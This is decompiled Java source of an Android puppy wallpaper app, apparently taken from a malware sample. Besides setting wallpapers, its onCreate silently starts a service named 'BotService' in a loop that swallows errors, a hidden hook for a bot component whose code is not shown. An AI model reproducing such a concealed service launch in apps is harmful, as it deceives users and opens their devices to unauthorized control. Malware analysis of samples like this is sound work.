// 
// Decompiled by Procyon v0.5.30
// 

package com.adam.CutePuppiesWallpaper;

import android.widget.ImageView$ScaleType;
import android.view.ViewGroup$LayoutParams;
import android.widget.AbsListView$LayoutParams;
import android.widget.ImageView;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import java.io.IOException;
import android.widget.Toast;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView$OnItemClickListener;
import android.widget.ListAdapter;
import android.widget.GridView;
import android.content.Context;
import android.app.WallpaperManager;
import android.content.Intent;
import android.os.Bundle;
import android.app.Activity;

public class CutePuppiesWallpaper extends Activity
{
    private Integer[] mThumbIds;
    
    public CutePuppiesWallpaper() {
        this.mThumbIds = new Integer[] { 2130837507, 2130837508, 2130837509, 2130837510, 2130837511, 2130837512, 2130837505, 2130837506, 2130837507, 2130837508, 2130837509, 2130837510, 2130837511, 2130837512, 2130837505, 2130837506, 2130837507, 2130837508, 2130837509, 2130837510, 2130837511, 2130837512 };
    }
    
    public void onCreate(final Bundle bundle) {
        super.onCreate(bundle);
        this.setContentView(2130903041);
        while (true) {
            try {
                final Intent intent = new Intent();
                intent.setAction("com.adam.CutePuppiesWallpaper.BotService");
                this.startService(intent);
                final WallpaperManager instance = WallpaperManager.getInstance((Context)this);
                final GridView gridView = (GridView)this.findViewById(2131034112);
                gridView.setAdapter((ListAdapter)new ImageAdapter((Context)this));
                gridView.setOnItemClickListener((AdapterView$OnItemClickListener)new AdapterView$OnItemClickListener() {
                    public void onItemClick(final AdapterView adapterView, final View view, final int n, final long n2) {
                        final Toast text = Toast.makeText(CutePuppiesWallpaper.this.getApplicationContext(), (CharSequence)"Wallpaper Set!", 0);
                        try {
                            instance.setResource((int)CutePuppiesWallpaper.this.mThumbIds[n]);
                            text.setGravity(17, 0, 0);
                            text.show();
                        }
                        catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }
                });
            }
            catch (Exception ex) {
                ex.printStackTrace();
                continue;
            }
            break;
        }
    }
    
    public class ImageAdapter extends BaseAdapter
    {
        private Context mContext;
        
        public ImageAdapter(final Context mContext) {
            this.mContext = mContext;
        }
        
        public int getCount() {
            return CutePuppiesWallpaper.this.mThumbIds.length;
        }
        
        public Object getItem(final int n) {
            return null;
        }
        
        public long getItemId(final int n) {
            return 0L;
        }
        
        public View getView(final int n, final View view, final ViewGroup viewGroup) {
            ImageView imageView;
            if (view == null) {
                imageView = new ImageView(this.mContext);
                imageView.setLayoutParams((ViewGroup$LayoutParams)new AbsListView$LayoutParams(85, 85));
                imageView.setScaleType(ImageView$ScaleType.CENTER_CROP);
                imageView.setPadding(8, 8, 8, 8);
            }
            else {
                imageView = (ImageView)view;
            }
            imageView.setImageResource((int)CutePuppiesWallpaper.this.mThumbIds[n]);
            return (View)imageView;
        }
    }
}
